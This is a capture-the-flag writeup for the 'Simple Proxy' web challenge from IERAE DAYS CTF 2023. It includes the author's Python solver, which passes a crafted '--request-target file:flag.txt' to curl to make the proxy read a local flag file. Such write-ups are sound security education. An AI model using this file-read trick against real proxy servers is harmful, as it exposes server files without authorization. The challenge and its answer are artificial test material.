---
title: "Simple Proxy - IERAE DAYS CTF 2023"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "subprocess", "simple", "proxy", "web", "ierae-days-ctf-2023"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_IERAE_DAYS_CTF_2023/web/simple-proxy"
license: "none stated"
ctf:
  name: "IERAE DAYS CTF 2023"
  year: 2023
  challenge: "Simple Proxy"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_IERAE_DAYS_CTF_2023/web/simple-proxy>
- **CTF:** IERAE DAYS CTF 2023

---

# [web] simple-proxy

## Description

シンプルなプロキシサーバ<br>
A simple proxy server.

## Attachments

- [simple-proxy](files/simple-proxy)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_IERAE_DAYS_CTF_2023/web/simple-proxy/solver/exploit.py>

```python
import subprocess
import os

APP_HOST = os.environ["APP_HOST"]

# ref. https://github.com/hyperium/http/blob/v1.1.0/src/uri/mod.rs#L847-L863
proc = subprocess.run(
    ["curl", f"http://{APP_HOST}", "--request-target", "file:flag.txt"],
    text=True,
    capture_output=True,
)
assert proc.returncode == 0
print(proc.stdout)
```
